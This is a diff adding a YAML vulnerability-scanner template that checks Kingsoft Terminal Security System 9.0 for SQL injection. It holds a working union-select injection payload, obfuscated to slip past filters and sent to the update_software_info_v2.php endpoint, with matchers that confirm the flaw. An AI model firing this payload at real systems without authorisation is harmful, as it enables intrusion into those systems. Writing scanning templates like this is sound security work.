@@ -1,0 +1,29 @@
+id: poc-yaml-jinkshan-terminal-security-system-sqli
+info:
+  name: 金山终端安全系统9.0-SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  v1: "{{rand_int(100,1000)}}"
+  v2: "{{md5(v1)}}"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/inter/update_software_info_v2.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      type=--1E0union/**/se#lect-1E0,2,1,md5({{v1}}),5,6,7,8--&key=&pageCount=1&curPage=1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{v2}}"
+          - "nResult"
